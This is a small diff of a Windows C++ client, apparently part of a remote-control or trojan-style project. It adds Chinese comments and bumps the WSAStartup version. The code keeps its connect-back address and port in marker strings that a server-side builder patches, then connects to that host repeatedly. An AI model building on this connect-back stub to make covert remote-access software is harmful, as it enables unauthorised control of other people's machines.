@@ -7,6 +7,7 @@
 // 在服务端创建客户端时，可以自定义客户端连向的域名和端口
 const int gOffsetDomain = 10;
 const int gOffsetPort = 13;
+//默认地址+端口
 static char gDomain[100] = "DNSDNSDNS:127.0.0.1 ";
 static char gPort[100] = "PORTPORTPORT:18000 ";
 
@@ -29,7 +30,8 @@ int APIENTRY WinMain(HINSTANCE hInstance,
 
     // 初始化Windows socket功能，要在Windows使用网络必须初始化这个
     WSAData wsaData;
-    if (WSAStartup(MAKEWORD(2,1), &wsaData)) {
+    //由2.1修改为2.2版本
+    if (WSAStartup(MAKEWORD(2,2), &wsaData)) {
         std::cout << "Failed to initialize WSA" << std::endl;
         return -1;
     }
@@ -76,6 +78,7 @@ int APIENTRY WinMain(HINSTANCE hInstance,
 		char domain[100] = {0};
 		char *domainStartPos = (char*)gDomain+gOffsetDomain;
 		char *domainStopPos = strchr(domainStartPos, ' ');
+        //字符串中获取ip, int(port)
 		memcpy(domain, domainStartPos, domainStopPos-domainStartPos);
         client.connectTo(domain, atoi(gPort+gOffsetPort));
         Sleep(1000);
